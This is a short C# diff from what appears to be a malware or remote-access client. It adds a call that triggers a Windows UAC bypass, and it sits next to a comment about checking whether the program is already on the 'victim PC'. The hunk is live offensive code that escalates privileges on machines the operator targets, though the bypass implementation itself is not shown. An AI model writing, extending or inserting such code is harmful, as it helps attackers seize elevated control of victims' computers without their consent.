@@ -20,6 +20,9 @@ namespace Client
             ArgsParser(args);
             CheckRealApplication();
 
+            if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
+                Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
+
 #if !DEBUG
             /// Check if Application is already on victim PC.
             if (!Constants.IsInVictimPC())
